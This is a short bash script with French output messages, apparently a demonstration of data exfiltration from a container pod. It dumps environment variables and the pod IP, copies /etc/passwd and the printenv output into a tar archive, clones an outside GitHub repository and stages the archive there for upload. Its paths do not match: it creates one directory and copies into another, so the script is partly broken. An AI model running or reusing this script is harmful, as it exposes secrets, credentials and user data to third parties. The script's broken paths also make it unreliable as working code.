#!/bin/bash

set -e

echo "Date et heure : $(date)"

echo "Adresse IP du pod (via hostname) :"
hostname -i

echo "Liste des fichiers /tmp :"
ls -l /tmp

echo "Variables d'environnement :"
printenv

# Installe git
apt-get update && apt-get install -y git

echo "Collecte des données sensibles..."

mkdir -p /tmp/data_exfiltrated
cp /etc/passwd /tmp/exfiltration/users.txt
printenv > /tmp/exfiltration/env_vars.txt


echo "Création de l'archive..."
tar czf /tmp/data_exfiltrated.tar.gz -C /tmp/exfiltration .


# Clone le repo 
git clone https://github.com/Fekr09a/ai-demo.git
cd ai-demo
git config user.email "Paris@PlatformCon.com"
cp /tmp/data_exfiltrated.tar.gz .
ls
git add data_exfiltrated.tar.gz

echo "Les données ont été collectées et archivées dans /tmp/data_exfiltrated.tar.gz"
echo "Script terminé."
